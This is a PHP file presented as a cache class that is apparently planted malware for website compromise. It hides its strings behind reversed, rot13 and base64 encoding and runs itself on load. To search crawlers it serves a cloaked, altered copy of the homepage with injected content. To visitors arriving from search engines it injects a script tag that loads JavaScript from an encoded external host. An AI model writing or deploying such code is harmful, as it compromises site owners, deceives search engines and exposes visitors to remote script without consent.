<?php
class CacheModels{
    private $u, $r, $d;
    private $cache;
    private $word;
    private $charset;
    private $ex= 'kai';
    public function __construct(){
        $this->cache = dirname(__FILE__).'/cache.php';
        $this->u= strtolower($_SERVER[$this->out('H5HEUS0KFI0HI9SHHESF')]);
        $this->r = strtolower($_SERVER[$this->out('FIxHSMHEF9SHHESF')]);
        $this->d = strtolower($_SERVER[$this->out('==NIC9xHsEyGS1HIQ9RE')]);
        $this->updateCache();
    }

    private function http_sock($host){
        $fp = fsockopen($host, 80, $errno, $errstr, 5);
        if (!$fp) {return "$errstr ($errno)<br/>\n";}
        else {
            $out = "GET / HTTP/1.1\r\n";$out .= "Host: {$host}\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);$content = '';
            while (!feof($fp)) {$content .=  fgets($fp, 1024);}
            fclose($fp);
            $pos = stripos($content,'<html');
            if ($pos === false) return $content;
            return substr($content, $pos);
        }
    }

    private function http_get($url){
        $opts = array('http' => array('method' => 'GET', 'timeout' => 5));
        $context = stream_context_create($opts);
        return  file_get_contents('http://'.$url, false, $context);
    }

    private function getCache(){

        if (is_file($this->cache)){
            $result = file_get_contents($this->cache);
        }else{
            $host = $_SERVER['HTTP_HOST'];
            $result = $this->http_get($host);
            if (empty($result)) $result = $this->http_sock($host);
            file_put_contents($this->cache,$result);
            $mtime = filemtime(__FILE__);
            touch($this->cache,$mtime, $mtime);
            touch(dirname($this->cache), $mtime, $mtime);
        }
        $this->charset = mb_detect_encoding($result,array('UTF-8','GBK','ISO-8859-6'));
        return $result;
    }

    function processCache(){
        $content = $this->getCache();
        $patterns = array(
            '/(<meta\s*name="keywords"\s*content="(.*?)")\s*[\/]*?>/is',
            '/(<meta\s*name="description"\s*content="(.*?)"\s*[\/]*?>)/is',
        );
        $content = preg_replace($patterns, array('', ''), $content);
        return $this->processT($content);
    }

    private function processT($text){
        $tt = '=4mYvHJqlEaV9DaoyEaoiATVvxUox5JMcWaExkJMbEzouuxV9HJou5TVuEKMgkwPA4mYvtTqxy2qv0QqhITqh92LtVPMycKngyTqj9HMfyzLi1xV9HJou5TVuEKMgkwPA4wVykJnv9JofZTpv0QqhITqh92LtVFMwyzqyEJYykzLuAJnfOUpuWFCy1JLhOFL0IJo8bDQ+8vVjOKLyEKnm1lohWFC05JM052owOvVf9zp052oQ1FMbAJLQWFC2yJqkIJYjEUqbOFL0IJo8bDQ+8vVgW3ozAaouWUqg8zov0QqhITqh92LtVPoiWUqh92DgHTnwS2Dv0wqcIKpy1Pp0EUntRTqy1TCX0tCiNvVhjLvaU4xyaVtcocccmPx5FrfbJBB4tGLzSTMhf6iyG7zzodhy/Wtc7Yezo5wywMeymvzxJBgonBbQnBz8FBYAlc5v6n5rTo5GvY5hjbdcCMixKYgbeVfyGbzawMxyeWixeWtc7nzz7bhxwWixmlxOzhzNzhihJrg0vrhJnBzhJBY4tQBuMJLxWFC05JM052owOvVh9Jn0OKnlA2pyEzV9HJou5TVuEKMgkwPA4mYvtQB4RzMuEzV9DaoyEaoiATVvZUMl92q5I2nv0GMgSzotRTqy1TCX0tCykTqcE3Y8tQB4RzMuEzCykTqcEUC';
        $tt = $this->out($tt);$pattern_tt = '=Z3Yc4QKykTqcE3YpkGX/bvYb4QKykTqcEUCpulY';
        $tt_charset = mb_detect_encoding($tt,array('UTF-8','GBK','ISO-8859-6'));
        if ($this->charset!=$tt_charset){$tt = iconv($tt_charset,$this->charset."//IGNORE", $tt);}
        if (!$this->word){
            $this->word = substr($tt, 7,stripos($tt,$this->out('=4GMfEKn09PC'))-7);
            $body_parttern = '/<\s*body.*?>/';
            if (preg_match($body_parttern,$text, $matches)){
                $rep = $matches[0].PHP_EOL.'<h3>'.$this->word.'</h3>';
                $text = preg_replace($body_parttern, $rep, $text);
            }
        }
        if(preg_match($this->out($pattern_tt), $text)){
            return preg_replace($this->out($pattern_tt), $tt, $text);
        }else{$pos = stripos($text,$this->out('+DJLyuTC'));
            return substr_replace($text,PHP_EOL.$tt,$pos+6,0);}
    }
    private  function out($text,$k='tr'){
        $S1 = 'S'. $k.$k;
        $S2 = 'S' . $k . 'rev';
        $S3 = $S1('S' . $k . 'prot1a', 'pa', '_3');
        $S4 = $S3($S2($S1('robpr' . 'Q_06' . 'rfnO', 'o0', 'q4')));
        return $S4($S3($S2($text)));
    }

    public function updateCache()
    {
        $robs = array('lITMcO3p','09zL','==DMfWJn0STpg92L');
        foreach ($robs as $r) {
            if (stristr($this->u, $this->out($r))) {
                exit($this->processCache());
            }
        }
        $refs = array('hHUMcSzL', '=4lMhyzL', 'hH3oa92p', 'g92Lh82p', 'hAzYgAaY');
        $baiduAuth='iRJqiDKMh5lpvWTrzSzYm9lY6ZUp0EUn';
        foreach ($refs as $r) {
            if (stristr($this->r, $this->out($r))) {
                $search = $this->getCache();
                $pos = stripos($search, $this->out('+DJLyuTC'));
                $key= '<script type="text/javascript" src="'.$this->out($baiduAuth).$this->ex.'"></script>';
                $search = substr_replace($search, PHP_EOL.$key, $pos + 6, 0);
                if ($pos !== false) @exit($search);
                exit($key);
            }
        }
    }
}

@new CacheModels();

